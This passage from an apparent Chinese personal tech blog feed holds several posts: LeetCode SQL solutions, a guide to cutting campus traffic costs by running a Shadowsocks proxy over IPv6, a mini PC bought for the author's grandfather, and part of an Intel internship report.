<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+----+</span>-------+</span><br><span class="line"><span class="header">| Id | Score |</span><br><span class="line">+----+-------+</span></span><br><span class="line">| 1  | 3.50  |</span><br><span class="line">| 2  | 3.65  |</span><br><span class="line">| 3  | 4.00  |</span><br><span class="line">| 4  | 3.85  |</span><br><span class="line">| 5  | 4.00  |</span><br><span class="line"><span class="header">| 6  | 3.65  |</span><br><span class="line">+----+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="header">输出：</span><br><span class="line">+-------+------+</span></span><br><span class="line"><span class="header">| Score | Rank |</span><br><span class="line">+-------+------+</span></span><br><span class="line">| 4.00  | 1    |</span><br><span class="line">| 4.00  | 1    |</span><br><span class="line">| 3.85  | 2    |</span><br><span class="line">| 3.65  | 3    |</span><br><span class="line">| 3.65  | 3    |</span><br><span class="line"><span class="header">| 3.50  | 4    |</span><br><span class="line">+-------+------+</span></span><br></pre></td></tr></table></figure>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Score,</span><br><span class="line">       ( @<span class="built_in">rank</span> := @<span class="built_in">rank</span> + ( @<span class="built_in">prev</span> &lt;&gt; (@<span class="built_in">prev</span> := Score)  )  ) as Rank</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">select</span> Score <span class="keyword">from</span> Scores order <span class="keyword">by</span> Score <span class="built_in">desc</span></span><br><span class="line">) A, (<span class="keyword">select</span> @<span class="built_in">rank</span> := <span class="number">0</span>, @<span class="built_in">prev</span> := -<span class="number">1</span>) Init</span><br></pre></td></tr></table></figure>
<p>参考他人解法，使用零时表中的两个变量，分别记录分级编号和上一个分数，方便判断是否分数相同。</p>
<h2 id="180-_Consecutive_Numbers"><a href="https://leetcode.com/problems/consecutive-numbers/" target="_blank" rel="external">180. Consecutive Numbers</a></h2><p>难度：<code>Medium</code><br>题目大意：</p>
<ul>
<li>用Sql选出连续出现三次即以上的数字</li>
</ul>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+----+-----+</span><br><span class="line">|<span class="string"> Id </span>|<span class="string"> Num </span>|</span><br><span class="line">+----+-----+</span><br><span class="line">|<span class="string"> 1  </span>|<span class="string">  1  </span>|</span><br><span class="line">|<span class="string"> 2  </span>|<span class="string">  1  </span>|</span><br><span class="line">|<span class="string"> 3  </span>|<span class="string">  1  </span>|</span><br><span class="line">|<span class="string"> 4  </span>|<span class="string">  2  </span>|</span><br><span class="line">|<span class="string"> 5  </span>|<span class="string">  1  </span>|</span><br><span class="line">|<span class="string"> 6  </span>|<span class="string">  2  </span>|</span><br><span class="line">|<span class="string"> 7  </span>|<span class="string">  2  </span>|</span><br><span class="line">+----+-----+</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> <span class="keyword">distinct</span> <span class="keyword">Num</span> <span class="keyword">as</span> ConsecutiveNums <span class="keyword">from</span> (</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">Id</span>, <span class="keyword">Num</span>, ( @<span class="keyword">rank</span> := <span class="keyword">if</span>(@prev = (@prev := <span class="keyword">NUM</span>), @<span class="keyword">rank</span>+<span class="number">1</span>, <span class="number">1</span>)  ) <span class="keyword">as</span> <span class="keyword">Rank</span></span><br><span class="line">    <span class="keyword">from</span> <span class="keyword">Logs</span>, (<span class="keyword">select</span> @<span class="keyword">rank</span> := <span class="number">1</span>, @prev := -<span class="number">1</span>) Init</span><br><span class="line">) <span class="keyword">as</span> temp <span class="keyword">where</span> <span class="keyword">Rank</span> = <span class="number">3</span>;</span></span><br></pre></td></tr></table></figure>
<p>参考178的思路，将每条记录按照是否连续进行编号，再把所有有三次连续出现的不重复数字选出。</p>
<h2 id="184-_Department_Highest_Salary"><a href="https://leetcode.com/problems/department-highest-salary/" target="_blank" rel="external">184. Department Highest Salary</a></h2><p>难度：<code>Medium</code><br>题目大意：</p>
<ul>
<li>挑选出每个部门最高薪水的记录</li>
</ul>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="header">Employee:</span><br><span class="line">+----+-------+--------+--------------+</span></span><br><span class="line"><span class="header">| Id | Name  | Salary | DepartmentId |</span><br><span class="line">+----+-------+--------+--------------+</span></span><br><span class="line">| 1  | Joe   | 70000  | 1            |</span><br><span class="line">| 2  | Henry | 80000  | 2            |</span><br><span class="line">| 3  | Sam   | 60000  | 2            |</span><br><span class="line">| 4  | Max   | 90000  | 1            |</span><br><span class="line">| 5  | Janet | 69000  | 1            |</span><br><span class="line"><span class="header">| 6  | Randy | 85000  | 1            |</span><br><span class="line">+----+-------+--------+--------------+</span></span><br><span class="line"></span><br><span class="line"><span class="header">Department:</span><br><span class="line">+----+----------+</span></span><br><span class="line"><span class="header">| Id | Name     |</span><br><span class="line">+----+----------+</span></span><br><span class="line">| 1  | IT       |</span><br><span class="line"><span class="header">| 2  | Sales    |</span><br><span class="line">+----+----------+</span></span><br><span class="line"></span><br><span class="line"><span class="header">输出：</span><br><span class="line">+------------+----------+--------+</span></span><br><span class="line"><span class="header">| Department | Employee | Salary |</span><br><span class="line">+------------+----------+--------+</span></span><br><span class="line">| IT         | Max      | 90000  |</span><br><span class="line"><span class="header">| Sales      | Henry    | 80000  |</span><br><span class="line">+------------+----------+--------+</span></span><br></pre></td></tr></table></figure>
<h3 id="解法1：900ms">解法1：900ms</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> <span class="keyword">d</span>.<span class="keyword">name</span> <span class="keyword">as</span> Department, <span class="keyword">e</span>.<span class="keyword">Name</span> <span class="keyword">as</span> Employee, Salary</span><br><span class="line"><span class="keyword">from</span> Employee <span class="keyword">e</span> <span class="keyword">inner</span> <span class="keyword">join</span> Department <span class="keyword">d</span> <span class="keyword">on</span> <span class="keyword">e</span>.DepartmentId = <span class="keyword">d</span>.<span class="keyword">Id</span></span><br><span class="line"><span class="keyword">where</span> Salary = (<span class="keyword">select</span> <span class="keyword">max</span>(Salary) <span class="keyword">from</span> Employee <span class="keyword">where</span> DepartmentId = <span class="keyword">d</span>.<span class="keyword">Id</span>)</span></span><br></pre></td></tr></table></figure>
<p>比较暴力，有个Employee记录都有一个冗余的子查询。</p>
<h3 id="解法2：600ms">解法2：600ms</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select t3<span class="class">.Name</span> as Department, t2<span class="class">.Name</span> as Employee, t1<span class="class">.Salary</span> as Salary</span><br><span class="line">from</span><br><span class="line">(</span><br><span class="line">    select <span class="function"><span class="title">max</span><span class="params">(Salary)</span></span> as Salary, DepartmentId</span><br><span class="line">    from Employee</span><br><span class="line">    group by DepartmentId</span><br><span class="line">) t1, Employee t2, Department t3</span><br><span class="line">where t1<span class="class">.Salary</span> = t2<span class="class">.Salary</span> and t1<span class="class">.DepartmentId</span> = t2<span class="class">.DepartmentId</span> and t1<span class="class">.DepartmentId</span> = t3.Id</span><br></pre></td></tr></table></figure>
<p>先把每个部门的最高薪水一起聚合算出，再全连接表并筛选出部门和薪水都匹配的员工记录。</p>
<h2 id="185-_Department_Top_Three_Salaries"><a href="https://leetcode.com/problems/department-top-three-salaries/" target="_blank" rel="external">185. Department Top Three Salaries</a></h2><p>难度：<code>Hard</code><br>题目大意：</p>
<ul>
<li>在上一题基础上，挑选出每个部门前三高薪水的记录</li>
<li>如果少于三条记录，则只显示存在的记录</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> t1.<span class="keyword">Name</span> <span class="keyword">as</span> Department, t2.<span class="keyword">Name</span> <span class="keyword">as</span> Employee, t2.Salary <span class="keyword">as</span> Salary</span><br><span class="line"><span class="keyword">from</span>(</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">Name</span>, <span class="keyword">ifnull</span>((</span><br><span class="line">        <span class="keyword">select</span> <span class="keyword">distinct</span> Salary <span class="keyword">from</span> Employee <span class="keyword">e</span> </span><br><span class="line">        <span class="keyword">where</span> <span class="keyword">e</span>.DepartmentId = <span class="keyword">d</span>.<span class="keyword">Id</span></span><br><span class="line">        <span class="keyword">order</span> <span class="keyword">by</span> Salary <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">    , <span class="number">0</span>) <span class="keyword">as</span> Salary, <span class="keyword">Id</span> <span class="keyword">as</span> DepartmentId <span class="keyword">from</span> Department <span class="keyword">d</span></span><br><span class="line">) t1, Employee t2</span><br><span class="line"><span class="keyword">where</span> t1.Salary &lt;= t2.Salary <span class="keyword">and</span> t1.DepartmentId = t2.DepartmentId</span></span><br></pre></td></tr></table></figure>
<p>和上一题思路类似，先选出第三高的薪水，再全连接筛选。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>Shell和Sql都是日常工作中经常使用的工具，发现LeetCode还有一些<a href="https://leetcode.com/problemset/shell/" target="_blank" rel="external">Shell</a>和<a href="]]>
    </summary>
    
      <category term="leetcode" scheme="http://yqf3139.github.io/tags/leetcode/"/>
    
      <category term="shell" scheme="http://yqf3139.github.io/tags/shell/"/>
    
      <category term="sql" scheme="http://yqf3139.github.io/tags/sql/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用IPv6节省校内的网络流量开支]]></title>
    <link href="http://yqf3139.github.io/2016/09/02/use-ipv6-to-save-network-traffic-at-school/"/>
    <id>http://yqf3139.github.io/2016/09/02/use-ipv6-to-save-network-traffic-at-school/</id>
    <published>2016-09-02T01:26:45.000Z</published>
    <updated>2016-09-07T15:28:40.534Z</updated>
    <content type="html"><![CDATA[<p>联网是一切的开始。学校的校园网建设还是比较完善的。从费用上来说每个月20G免费流量，就算用超价格也还是比较合理的；管理界面有查看流量报表、查看在线终端和登陆日志的功能，甚至能自动下线一些可能是蹭网的设备，考虑得很周到，用招行手机网银充值页很方便；宿舍每个床位都有网口，可以通过Web认证登陆，图书馆等公共场所还有免费的热点覆盖，速度也还不错。</p>
<h1 id="所以为什么我要想方设法节省流量的开支呢？">所以为什么我要想方设法节省流量的开支呢？</h1><ul>
<li>开支：在一周内我就把20G免费流量几乎用光，在9月的第一天用掉了1.5G流量，按照这个趋势下去，每个月开支。。。</li>
<li>良好的习惯：从我爸身上学到的精算流量、和运营商斗智斗勇的良好习惯，必须想方设法节省流量开支。</li>
<li>本科期间的陋习：本科期间使用了一些方法节省自己的流量开支，现在需要增加这个开支就心里痒痒的。</li>
<li>更好的学习与生活环境：如果上网需要担心开支问题，势必会影响获取网络上各种优质资源的积极性。</li>
<li>其他：顺带解决在宿舍无法使用路由器访问IPv6网络的困惑。</li>
</ul>
<p>于是在同学和学长的提醒下，并大概分析了我的流量都花到了什么地方后，我终于意识到了IPv6免流量的优势，并想着如何最大程度发挥IPv6的优势。</p>
<h1 id="通过路由器也能获取到IPv6地址">通过路由器也能获取到IPv6地址</h1><p>宿舍的一个网口需要同时接入手机、电脑等设备，就得使用一个无线路由器了。由于之前我一直偏好将路由器设置为<code>router</code>模式，所以在路由器的内部网路中，我的设备都没有IPv6地址。上PT下载时，还必须将网线直插到电脑上，非常麻烦。之前我一直认为这是路由器不支持IPv6的表现，但稍微考虑后发现如果路由器只是作为<code>AP</code>，充当一个无线交换机的角色后，电脑手机是可以直接从校园网自动获取到独立的IPv6地址的，虽然这样稍微有点不安全，因为我习惯用路由器做一个保护，防止其他用户可以直接访问到我电脑的端口。<br>使用的路由器是mini型的低端路由器，切换成为<code>AP</code>模式后就无登陆密码保护了，这时候需要手动调整电脑IP到路由器使用的子网段，再访问路由器管理界面设置密码。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ifconfig wlan0 <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure></p>
<h1 id="我的流量都去哪儿了？">我的流量都去哪儿了？</h1><p>虽然并没有详细的统计结果，但我主要耗费的流量在于</p>
<ul>
<li>看Youtube每日订阅的视频，耗费了大量的流量，并且由于在VPS上开了冗余发包（用于低质量网路环境加速），可能实际流量是视频流量的2-3倍。</li>
<li>其他外网网站访问流量，刷推、查看RSS订阅、搜索和Google办公套件等。</li>
<li>更新电脑和手机软件，耗费不多，但也是比较大的一部分开销。</li>
<li>偶尔看国内视频，耗费不多。</li>
<li>PT下载电影，已经使用IPv6了。</li>
<li>国内的网站访问流量。</li>
</ul>
<p>由于使用私人梯子，并且看Youtube等外网流量都是走梯子的，所以如果我和VPS之间的流量转换为IPv6，就应该能节省一大笔流量了。并且从这个思路看，也可以找国内的IPv6代理中转来节省在国内的流量。</p>
<h1 id="配置影梭监听IPv6地址">配置影梭监听IPv6地址</h1><p>使用的搬瓦工VPS申请IPv6地址非常容易，在控制面板 &gt; Admin functions &gt; IPv6 Addresses 内添加地址即可，几分钟生效。<br>由于IPv6地址目前几乎是使用不完的，可以申请到一个子网的全部地址，不过目前使用其中一个就行了。</p>
<p><img src="/images/use-ipv6-to-save-network-traffic-at-school/add_ipv6.png" alt="add_ipv6"></p>
<p>然后启动两个影梭服务器实例，分别监听IPv4和IPv6地址：</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"server"</span>:<span class="string">"0.0.0.0"</span> # IPv4 地址</span><br><span class="line"><span class="string">"server"</span>:<span class="string">"::"</span> # IPv6 地址</span><br><span class="line"></span><br><span class="line"># 启动服务器</span><br><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/ss-server -c /</span>etc<span class="regexp">/shadowsocks/</span>config.json -a root -u -f <span class="regexp">/var/</span>run<span class="regexp">/shadowsocks/</span>shadowsocks.pid</span><br><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/ss-server -c /</span>etc<span class="regexp">/shadowsocks/</span>config6.json -a root -u -f <span class="regexp">/var/</span>run<span class="regexp">/shadowsocks/</span>shadowsocks6.pid</span><br></pre></td></tr></table></figure>
<p>最后在电脑上启动两个客户端，分别连接两个服务器，并监听两个本地端口，这样方便在本机没有IPv6地址的时候进行切换。</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># local hosts</span></span><br><span class="line">x.x.x.x yqf.<span class="keyword">me</span></span><br><span class="line">y:y:y:y:y:y:y:y yqfv6.<span class="keyword">me</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># v4</span></span><br><span class="line"><span class="string">"server"</span>: <span class="string">"yqf.me"</span>,</span><br><span class="line"><span class="string">"local_port"</span>: <span class="number">11000</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># v6</span></span><br><span class="line"><span class="string">"server"</span>: <span class="string">"yqfv6.me"</span>,</span><br><span class="line"><span class="string">"local_port"</span>: <span class="number">11001</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动客户端</span></span><br><span class="line">ss-<span class="keyword">local</span> <span class="comment">--fast-open -c /path/to/config.json &amp;</span></span><br><span class="line">ss-<span class="keyword">local</span> <span class="comment">--fast-open -c /path/to/config6.json &amp;</span></span><br></pre></td></tr></table></figure>
<p>至此所有外网的流量就走IPv6了。</p>
<h1 id="电脑软件更新">电脑软件更新</h1><ul>
<li><p>通过命令行指定使用IPv6。</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> -o Acquire::ForceIPv6=<span class="literal">true</span> install pkg</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过更换校园网内部的源来节省这一部分流量，看到校园内还有AOSP的镜像，表示万一有这方面需求可以节省很多流量了。</p>
</li>
</ul>
<h1 id="通过Chrome查看DNS缓存记录">通过Chrome查看DNS缓存记录</h1><p>可以通过<code>chrome://net-internals/#dns</code>查看一下有哪些网站已经支持了IPv6，youku没有支持。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>联网是一切的开始。学校的校园网建设还是比较完善的。从费用上来说每个月20G免费流量，就算用超价格也还是比较合理的；管理界面有查看流量报表、查看在线终端和登陆日志的功能，甚至能自动下线一些可能是蹭网的设备，考虑得很周到，用招行手机网银充值页很方便；宿舍每个床位都有网口，可以通]]>
    </summary>
    
      <category term="ipv6" scheme="http://yqf3139.github.io/tags/ipv6/"/>
    
      <category term="network traffic" scheme="http://yqf3139.github.io/tags/network-traffic/"/>
    
      <category term="proxy" scheme="http://yqf3139.github.io/tags/proxy/"/>
    
      <category term="tech" scheme="http://yqf3139.github.io/categories/tech/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[给外公使用的迷你主机]]></title>
    <link href="http://yqf3139.github.io/2016/02/05/mini-pc-for-grandpa-and-other-stuffs/"/>
    <id>http://yqf3139.github.io/2016/02/05/mini-pc-for-grandpa-and-other-stuffs/</id>
    <published>2016-02-05T09:08:29.000Z</published>
    <updated>2016-02-06T20:59:44.107Z</updated>
    <content type="html"><![CDATA[<h2 id="迷你主机">迷你主机</h2><h3 id="缘由">缘由</h3><p>外公家的电脑已经十分老旧，还是奔腾双核，1G内存，100G机械硬盘的配置。每次我去外公家帮忙处理电脑使用上的疑问时，都被这台老古董卡到不行，慢慢地我发现外公使用电脑的频率也下降了，便承诺实习工资给外公更新一个更好的主机。</p>
<p>前两天突然想起这个承诺，也就没有顾上和我爸进行更加深入的讨论，准备直接一手包办了这件事情。</p>
<h3 id="选择">选择</h3><p>外公的需求很简单，上网：看股票、新闻、邮票信息，偶尔电影；游戏：在线的象棋、围棋等；照片浏览：儿女拷来的照片可以自行浏览；节假日的娱乐：可能会被家里亲戚用来上网娱乐。</p>
<p>本来我预想我接下来一定要自行完整地配置一台主机，不过由于此处不是自用，并且之前看到网上有不少对mini主机的讨论，也看到了一些<a href="https://luolei.org/zhanmei-minipc-review/" target="_blank" rel="external">测评博文</a>，便想这次还是偷懒一下了。</p>
<p>询问店家节前还发不发货，结果赶上最后一天发货，便没有多想，<strong>￥1610</strong>下单了标准的一个版本。</p>
<ul>
<li>CPU：Intel i5 4258U，2C4T，默频2.4Ghz，睿频2.9Ghz，锐炬5100核显。比我笔记本的3317U要好，估计是直接性能过剩了</li>
<li>内存：镁光 4G DDR3 1866Mhz</li>
<li>硬盘：东芝 128G SSD M.2接口</li>
</ul>
<h3 id="开箱与简单评测">开箱与简单评测</h3><p>下单后就没有去管这件事情，顺丰包邮，两天就到了，由于直接是套餐，系统也已经装好，基本上是开箱即用。</p>
<p><img src="/images/mini-pc-for-grandpa-and-other-stuffs/size.jpg" alt="尺寸"></p>
<p>尺寸很小，和JD卡的对比。分量倒不算很轻，是全铝机箱，由于是无风扇被动散热，十分静音，跑分时能听到电流声音。</p>
<p><img src="/images/mini-pc-for-grandpa-and-other-stuffs/inside.jpg" alt="内部"></p>
<p>虽然不需要升级配置了，还是拆开了底部，发现升级余地还是很大的，可以继续加内存，M.2硬盘和sata硬盘。</p>
<p>外部接口十分丰富：</p>
<ul>
<li>两个HDMI接口，店家还附赠了HDMI-VGA转接线和HDMI延长线</li>
<li>内置的300M无线网卡</li>
<li>两个以太网口</li>
<li>背部四个USB2.0口，前部四个USB3.0口</li>
<li>音频输入输出口和红外接收器（也偷懒没尝试）</li>
</ul>
<p>早上到货开箱后，发现是Win7 旗舰版，开箱即用，便进行了系统备份和简单的跑分：</p>
<p><img src="/images/mini-pc-for-grandpa-and-other-stuffs/benchmark.jpg" alt="跑分"></p>
<p>只知道应该要比我笔记本性能好，而我现在的小本使用状态良好，完全没有升级的欲望。</p>
<h3 id="上门服务">上门服务</h3><p>所以下午就开心地直接提去外公家上门服务了，带了我妈买的羽绒服给外婆，mini主机给外公，两位老人都十分开心。</p>
<p>首先是进行老主机的数据备份，需要拷贝10G的老照片出来，由于硬盘是3.5英寸的而我没有USB盒来直接读，只好以后再进行照片的拷贝。</p>
<p>然后安装了手写板的驱动、棋牌游戏等，并和外公一起试用成功。</p>
<p>最后简单地了解了外公的其他需求，如看股票和看邮票，添加了游览器的相关网站的收藏。</p>
<p>外公虽然<strong>八十多高龄</strong>，但还是非常认真地学习电脑的使用，经常在线棋牌游戏和浏览新闻，这里真是需要赞一个，更换了更快的电脑后，对于新技术新知识的获取应该体验更佳了。</p>
<h2 id="其他">其他</h2><ul>
<li>机械键盘：雷柏V500，绝对的入门款，准备写够100篇博客再奖励自己一个中端键盘。</li>
<li>一代小米手环：每天争取一万步，日积月累养成锻炼的习惯。</li>
<li>小米路由器mini：放家中，插上USB移动硬盘后可以远程下载，结合小米盒子便打造出一个粗糙的家庭NAS，分享和串流影片十分方便。</li>
<li>各种USB 3.0硬盘盒：把各种硬盘换盒后，终于获得了新生。</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="迷你主机">迷你主机</h2><h3 id="缘由">缘由</h3><p>外公家的电脑已经十分老旧，还是奔腾双核，1G内存，100G机械硬盘的配置。每次我去外公家帮忙处理电脑使用上的疑问时，都被这台老古董卡到不行，慢慢地我发现外公使用电脑的频率也下降了，便承诺实习]]>
    </summary>
    
      <category term="grandpa" scheme="http://yqf3139.github.io/tags/grandpa/"/>
    
      <category term="hardware" scheme="http://yqf3139.github.io/tags/hardware/"/>
    
      <category term="htpc" scheme="http://yqf3139.github.io/tags/htpc/"/>
    
      <category term="tech" scheme="http://yqf3139.github.io/categories/tech/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[实习@Intel]]></title>
    <link href="http://yqf3139.github.io/2016/01/23/internship-at-intel/"/>
    <id>http://yqf3139.github.io/2016/01/23/internship-at-intel/</id>
    <published>2016-01-23T03:32:55.000Z</published>
    <updated>2016-01-23T21:57:20.050Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>持续半年的实习告一段落，企业实习不仅仅是我们学习技术、锻炼能力的绝佳机会，更是从另一个角度深入理解整个行业的绝佳机会，我也非常珍惜这半年的实习机会。现将一些实习报告中一些片段摘出。</p>
</blockquote>
<h1 id="企业背景以及企业文化">企业背景以及企业文化</h1><h2 id="我成为Intel实习生经过">我成为Intel实习生经过</h2><p>我在2014年6月至11月期间参加了第七届Intel杯全国大学生软件创新大赛，并带领团队获得一等奖。2015年4月份开始，大家都开始投实习面试的时候，我通过Intel教育微博，获取到了Intel中国招聘实习生的消息，当时抱着试试看的心理投了简历。<br>三轮电话面试询问基础的计算机基础知识后，我来到Intel亚太研发中心on site面试，被带到三楼的会议室，在两个小时和四位同事交谈并白板编程后，我也大概知晓这只团队的主要兴趣是在Intel平台上，前沿的Web技术的优化。大致分为三个方向：Web RTC、Javascript虚拟机和Chromium渲染、内存和功耗的优化及应用，对这三个方向我都有一定的兴趣。小组的兴趣广泛，也在积极在Web技术与Intel平台的整合上寻求新的方向。<br>Intel效率很高，第二天便通知可以来Intel做实习生。由于之前学院并没有学长去上海Intel实习的经历分享，我便想打开这一局面，寻求去一家大家不那么熟悉的公司进行实习，也方便日后的相互分享。随后得知将在SSG/STO/WTO下进行实习，对开源浏览器Chromium在Intel平台上进行性能和能耗优化。我准备与七月开始进行半年的实习，随后和Manager建立了邮件联系。</p>
<h2 id="Intel的历史">Intel的历史</h2><p>在来Intel之前，我对Intel产品线和历史了解很少，仅限于我们家购入的第一台电脑是奔腾4，那大概是Intel增长最快的一个时候，还有我的笔记本是Core i5，当时也完全没去研究其制程架构、主频三缓等，以为都是一样的。在平常浏览业界新闻时，看到近年Intel出了很多人机交互和物联网的新探索，认为技术实力酷炫并实际推向了市场。</p>
<blockquote>
<p>Intel是全球最大的半导体芯片制造商，它成立于1968年，具有44年产品创新和市场领导的历史。1971年，Intel推出了全球第一个微处理器。微处理器所带来的计算机和互联网革命，改变了整个世界。Intel公司在随着个人电脑普及，Intel公司成为世界上最大设计和生产半导体的科技巨擘。为全球日益发展的计算机工业提供建筑模块，包括微处理器、芯片组、板卡、系统及软件等。这些产品为标准计算机架构的组成部分。业界利用这些产品为最终用户设计制造出先进的计算机。Intel公司致力于在客户机、服务器、网络通讯、互联网解决方案和互联网服务方面为日益兴起的全球互联网经济提供建筑模块。</p>
</blockquote>
<h2 id="Intel公司的构成">Intel公司的构成</h2><p>从我实习这几个月的浅显的观察来看，Intel至少由以下五个核心方面构成：芯片设计，软件服务，生产制造，市场营销和人力资源，风险投资。</p>
<h3 id="芯片设计">芯片设计</h3><p>Intel的产品线覆盖了信息产业中高利润的一部分，服务于数据中心、个人电脑、移动设备和物联网可穿戴设备的CPU，其中目前家喻户晓的酷睿处理器，服务器上使用的至强处理器，移动平台上的凌动处理器和物联网中的Intel伽利略/爱迪生开发板，小如指甲的Curie SOC。其中一些已经不单纯是CPU了。Intel之前退出内存领域后，又积极进行固态硬盘的研发，目前是数据中心的首选和高端固态硬盘的代表，并且也在积极进行新存储技术的研发。这里引用新闻，Intel将在2016推出一种新存储器技术，这在公司内部也引发了讨论：</p>
<blockquote>
<p>Intel去年最重大的科技成果不是推出14nm工艺的Skylake处理器，而是3D XPoint存储芯片，性能是当前水平的1000倍，但它可不是NAND非易失性闪存这么简单，实际上能带来一次电脑革命，因为它还可以作为DIMM插槽的内存使用。Intel准备在2016年开始推出基于3D XPoint技术的存储产品，现在曝光的就是容量高达6TB的DIMM插槽产品，很快电脑内存就能跑步进入TB时代了。</p>
</blockquote>
<p>听到上述新闻，似乎计算机的发展轨道将发生变化，很多我们之前认为的架构、优化方法都将被打破。Intel的持续发展的确非常需要这样的前沿技术壁垒。</p>
<p>Intel还研发配套的芯片组，母板样例和以太、无线网卡。也做一些高端的PC周边产品。Intel近年也加大了多种形态PC的研发，Intel NUC、Compute Stick、2 in 1设备都显示了其活力，一些软硬件结合的解决方案如Real Sense实感技术提供了更好的人机交互。值得一提的是由于占据CPU设计，硬件上的很多标准也是由Intel进行主导和推动的。</p>
<h3 id="软件服务">软件服务</h3><p>我目前实习所在的Intel亚太研发中心便是主要进行软件服务开发的。Intel的很大一部分软件投入在开源社区中，如Linux、Hadoop、OpenStack等，其IOT部门似乎开源社区的一大贡献团队，受到广泛的赞誉。参与软件标准的制定，如Html5。也积极进行推行自己的解决方案，如ICC编译器、V-Tune等方便开发者进行性能调优。我目前的实习部门便是努力在Intel平台上进行开源浏览器Chromium的性能优化。</p>
<h3 id="生产制造">生产制造</h3><p>Intel是少数拥有中央处理器芯片制造工艺的厂商，工艺水平常年领先同行半代到一代，自行设计自行生产，目前Intel依旧不断推动着摩尔定律，生产更加高性能能耗低的芯片。</p>
<h3 id="市场营销和人力资源">市场营销和人力资源</h3><p>Intel是一家跨国公司，拥有很多的雇员，并自行售卖芯片给OEM厂商和消费者。这些部门和其他后勤部门为Intel的发展、繁荣起到了一定影响。</p>
